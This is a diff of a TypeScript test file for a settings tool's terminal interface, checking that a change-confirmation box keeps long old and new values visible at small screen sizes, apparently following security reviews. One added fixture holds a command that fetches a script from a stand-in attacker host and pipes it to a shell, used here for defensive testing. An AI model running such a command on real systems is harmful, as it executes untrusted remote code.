@@ -482,7 +482,7 @@ describe("what the next deploy removes (security review S3)", () => {
     const after = play(state, K.enter).state
     expect(after.notice).toEqual({
       tone: "info",
-      text: "Add one with `zekno settings set web.plain.<NAME> <value>`.",
+      text: "Add one with zekno settings set web.plain.<NAME> <value>.",
     })
   })
 
@@ -590,7 +590,7 @@ describe("a long value (security review S4)", () => {
     expect(seen).toContain("exec bun run start")
   })
 
-  test("the change box: the old and the new value whole when they fit; at 80 by 24 each cut, with the same line, and the question in view", () => {
+  test("the change box: the old and the new value whole when they fit; at 80 by 24 each cut around where they differ, no key named, and the question in view", () => {
     const medium = `sh -c '${"z".repeat(150)}'`
     const fitsWhole = play(
       opened({ columns: 100, rows: 30 }),
@@ -623,13 +623,37 @@ describe("a long value (security review S4)", () => {
     const cut = draw(asking, 80, 24)
     fits(cut, 80, 24)
     const all = words(cut.join("\n"))
+    // The change is at the end: each value from 16 characters before it, after a faint "…" (the walkthrough's rough edge).
     expect(all).toContain(
-      "now sh -c 'echo starting xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx … 47 more lines: c shows them in the Compose text new"
+      `now …${LONG_START.slice(-16)} new …${LONG_START.slice(-16)}!`
     )
+    expect(all).not.toContain("c shows them")
     expect(all).toContain(
       "? Write this to zekno.app.json? Nothing is deployed until you deploy."
     )
     expect(all).not.toContain("attacker")
+  })
+
+  test("the change box, a change in the middle of a long value: both cut around it, with … before and after, so the change is in view", () => {
+    const changed = LONG_START.replace("attacker.example", "example.org")
+    let state = play(long({ columns: 80, rows: 24 }), K.enter).state
+    const screen = top(state)
+    if (screen.name !== "settings" || !screen.change)
+      throw new Error("no change")
+    state = {
+      ...state,
+      stack: [
+        ...state.stack.slice(0, -1),
+        { ...screen, change: { ...screen.change, typed: changed } },
+      ],
+    }
+    const asking = draw(play(state, K.enter).state, 80, 24)
+    fits(asking, 80, 24)
+    const all = words(asking.join("\n"))
+    expect(all).toContain("now …curl -s https://attacker.example/x | sh ;x")
+    expect(all).toContain("new …curl -s https://example.org/x | sh ;x")
+    expect(all).toContain("x… new …curl")
+    expect(all).toContain("Write this to zekno.app.json?")
   })
 })
 
